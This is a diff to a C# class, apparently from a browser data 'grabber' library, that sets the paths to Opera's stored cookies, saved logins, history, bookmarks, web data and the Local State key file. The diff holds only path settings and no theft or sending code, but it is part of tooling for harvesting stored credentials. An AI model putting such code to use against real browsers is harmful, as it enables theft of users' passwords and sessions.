@@ -2,42 +2,55 @@
 
 namespace CockyGrabber.Grabbers
 {
-    public class OperaGrabber : BlinkGrabber 
-
+    public class OperaGrabber : BlinkGrabber
     {
-        public override string CookiePath
+        public override string DataRootPath
         {
             get
             {
-                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies";
+                return $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Opera Software\\Opera Stable";
             }
         }
         public override string LocalStatePath
         {
             get
             {
-                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State";
+                return $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Opera Software\\Opera Stable\\Local State";
+            }
+        }
+        public override string CookiePath
+        {
+            get
+            {
+                return $"\\Cookies";
             }
         }
         public override string LoginDataPath
         {
             get
             {
-                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data";
+                return $"\\Login Data";
             }
         }
         public override string HistoryPath
         {
             get
             {
-                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\History";
+                return $"\\History";
             }
         }
         public override string BookmarkPath
         {
             get
             {
-                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks";
+                return $"\\Bookmarks";
+            }
+        }
+        public override string WebDataPath
+        {
+            get
+            {
+                return $"\\Web Data";
             }
         }
     }
